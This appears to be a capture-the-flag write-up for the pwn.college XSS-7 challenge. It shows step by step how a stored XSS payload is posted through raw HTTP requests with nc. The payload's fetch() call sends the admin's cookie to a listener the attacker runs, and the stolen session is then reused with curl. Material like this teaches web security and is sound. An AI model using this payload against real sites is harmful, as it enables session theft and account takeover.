---
layout: page
title: "XSS-7 Write-up — pwn.college"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🔍 Challenge Overview

This challenge simulates a vulnerable blogging platform where:

- Users can log in, draft, and publish posts
- Admin visits public posts automatically using `/challenge/victim`
- The platform reflects user-submitted content without proper sanitization

Our goal is to inject JavaScript that **steals the admin's cookie** and sends it to our malicious server via a `fetch()` request.

---

## 🖥️ Server Behavior Summary

Key features:

- `/login`: POST endpoint to authenticate users
- `/draft`: Accepts and publishes post content (HTML/JS allowed)
- Admin visits published posts using an automated browser
- No XSS filtering or output sanitization

---

## ✅ Exploit Steps

### 1. Log in as `hacker`

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```
Response:
```
Set-Cookie: auth=hacker|1337; Path=/
```

### 2. Create a malicious XSS payload
Craft a `<script>` tag that sends the admin's cookies to your server:
```
printf "POST /draft HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:108\r\nCookie: auth=hacker|1337\r\nConnection: close\r\n\r\ncontent=<script>fetch('http://localhost:1337/?c='%%2BencodeURIComponent(document.cookie));</script>&publish=on" | nc -q 1 challenge.localhost 80
```
Explanation:
```bash
<script>fetch('http://localhost:1337/?c=' + encodeURIComponent(document.cookie));</script>
```
This sends the admin’s cookie to our local HTTP server when they visit the post.

### 3. Start your malicious server
``` 
python3 -m http.server 1337

```
Leave this running.

### 4. Trigger admin visit
Run:
```
/challenge/victim
```
Expected output:
```bash
Visiting http://challenge.localhost:80/
Visited! Go check if the attack worked!
```
In your terminal running the HTTP server, you should see a GET request like:
```bash\
127.0.0.1 - - [21/Jul/2025 14:50:XX] "GET /?c=auth%3Dadmin%7Csupersecret HTTP/1.1" 200 -
```

---

## Final Result
- The admin visited your post.
- JavaScript executed in their browser.
- Their cookie was exfiltrated to your server.

---

##  Flag Retrieval

Sometimes, the flag is either inside the cookie or used as a session. Check the intercepted cookie or re-authenticate using it:

```bash
curl -b "auth=admin|supersecret" http://challenge.localhost/
```
### Flag
```
(pwn.college{...} — varies per instance)
```
---
